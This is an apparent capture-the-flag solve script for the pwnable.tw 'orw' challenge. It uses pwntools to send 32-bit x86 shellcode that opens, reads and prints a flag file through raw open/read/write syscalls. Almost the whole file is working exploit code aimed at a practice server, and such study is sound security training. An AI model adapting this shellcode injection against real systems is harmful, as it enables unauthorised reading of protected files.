#!/usr/bin/env python3
"""
pwnable.tw - orw
Shellcode challenge: read flag using only open/read/write syscalls

32-bit x86 Linux syscall convention:
    eax = syscall number
    ebx, ecx, edx, esi, edi = arguments
    int 0x80 to invoke

Syscall numbers (32-bit):
    open  = 5
    read  = 3
    write = 4
"""

from pwn import *

context.arch = "i386"
context.os = "linux"

HOST = "chall.pwnable.tw"
PORT = 10001


def exploit():
    if args.LOCAL:
        p = process("./orw")
    else:
        p = remote(HOST, PORT)

    # Build shellcode to: open("/home/orw/flag") -> read(fd, buf, len) -> write(1, buf, len)
    shellcode = asm(
        """
        /* open("/home/orw/flag", O_RDONLY) */
        push 0x00006761      /* "ag\x00\x00" */
        push 0x6c662f77      /* "w/fl" */
        push 0x726f2f65      /* "e/or" */
        push 0x6d6f682f      /* "/hom" */
        mov ebx, esp         /* ebx = pointer to "/home/orw/flag" */
        xor ecx, ecx         /* ecx = 0 (O_RDONLY) */
        xor edx, edx         /* edx = 0 */
        mov eax, 5           /* syscall: open */
        int 0x80

        /* read(fd, esp, 0x40) */
        mov ebx, eax         /* ebx = fd from open */
        mov ecx, esp         /* ecx = buffer (use stack) */
        mov edx, 0x40        /* edx = size to read */
        mov eax, 3           /* syscall: read */
        int 0x80

        /* write(1, esp, 0x40) */
        mov ebx, 1           /* ebx = stdout */
        mov ecx, esp         /* ecx = buffer */
        mov edx, 0x40        /* edx = size to write */
        mov eax, 4           /* syscall: write */
        int 0x80
        """
    )

    log.info(f"Shellcode length: {len(shellcode)} bytes")

    p.recvuntil(b"shellcode:")
    p.send(shellcode)

    flag = p.recvall(timeout=2)
    log.success(f"Flag: {flag}")

    return flag


if __name__ == "__main__":
    exploit()
